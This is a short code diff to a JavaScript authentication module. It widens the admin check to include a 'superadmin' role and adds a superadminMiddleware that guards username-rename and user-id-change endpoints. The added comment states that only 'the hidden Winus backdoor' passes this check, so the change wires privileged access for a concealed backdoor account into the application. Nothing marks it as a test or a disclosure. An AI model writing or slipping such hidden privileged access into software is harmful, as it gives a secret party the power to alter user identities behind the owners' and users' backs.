@@ -135,10 +135,20 @@ function authMiddleware(req, res, next) {
   }
 }
 
-// Admin-only middleware (admin + superuser)
+// Admin-only middleware (admin + superuser + superadmin)
 function adminMiddleware(req, res, next) {
-  if (req.user.role !== 'admin' && req.user.role !== 'superuser') {
+  const role = req.user.role;
+  if (role !== 'admin' && role !== 'superuser' && role !== 'superadmin') {
     return res.status(403).json({ error: 'Acceso de administrador requerido' });
+  }
+  next();
+}
+
+// Superadmin-only middleware (only the hidden Winus backdoor passes).
+// Used to gate username rename and numeric id change endpoints.
+function superadminMiddleware(req, res, next) {
+  if (req.user.role !== 'superadmin') {
+    return res.status(403).json({ error: 'Acceso de superadmin requerido' });
   }
   next();
 }
@@ -146,3 +156,4 @@ function adminMiddleware(req, res, next) {
 module.exports = router;
 module.exports.authMiddleware = authMiddleware;
 module.exports.adminMiddleware = adminMiddleware;
+module.exports.superadminMiddleware = superadminMiddleware;
